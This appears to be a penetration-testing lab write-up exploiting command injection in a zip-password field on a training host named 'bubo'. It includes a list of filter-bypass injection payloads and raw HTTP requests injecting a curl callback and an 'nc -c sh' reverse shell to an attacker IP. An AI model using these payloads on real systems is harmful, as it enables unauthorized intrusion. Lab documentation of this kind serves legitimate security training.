
after getting `local.txt` this page is presented - hit `submit` to review `burp`

![[Pasted image 20241205111037.png]]
the `submissionData` & `zipPass` parameters are potential vectors
![[Pasted image 20241205111155.png]]
when checking the `Password Protect this Zip File` a `Password` field is presented
![[Pasted image 20241205111446.png]]
now reviewing it in `burp` the `passCheck` field now exists

![[Pasted image 20241205111628.png]]
send to `repeater` to begin testing

#### LCE
- tested for `LCE`, didnt find anything in  
![[Pasted image 20241205112806.png]]
#### RCE - proof.txt

![[Pasted image 20241205130503.png]]
testing payload
- in order to get `curl` to work in this field we had to use `common protection` bypass with this payload list from [[11.2 - 11.2.4 Dealing with Common Protections]]

```bash
bogus
;id
|id
`id`
i$()d
;i$()d
|i$()d
FAIL||i$()d
&&id
&id
FAIL_INTENT|id
FAIL_INTENT||id
`sleep 5`
`sleep 10`
`id`
$(sleep 5)
$(sleep 10)
$(id)
;`echo 'aWQK' |base64 -d`
FAIL_INTENT|`echo 'aWQK' |base64 -d`
FAIL_INTENT||`echo 'aWQK' |base64 -d`
```

```http
POST /personnelSubmission/index.php HTTP/1.1
Host: bubo
Content-Length: 100
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bubo
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bubo/personnelSubmission/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

submissionData=Data+goes+here.&passCheck=on&zipPass=`curl http://192.168.45.171:8000/test.txt`
```
python3 server `test.txt` hit, shows we have rce
![[Pasted image 20241205130619.png]]
now to catch a `reverse shell` - generate `nc -c sh 192.168.45.171 1337` with `revshells.com`

![[Pasted image 20241205133904.png]]
create a `nc` listener

submit `payload` with `URL` encoding `CTRL+U`
```bash
POST /personnelSubmission/index.php HTTP/1.1
Host: bubo
Content-Length: 88
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bubo
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bubo/personnelSubmission/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

submissionData=Data+goes+here.&passCheck=on&zipPass=`nc+-c+sh+192.168.45.171+1337`
```
catch `revshell` & profit
![[Pasted image 20241205135720.png]]
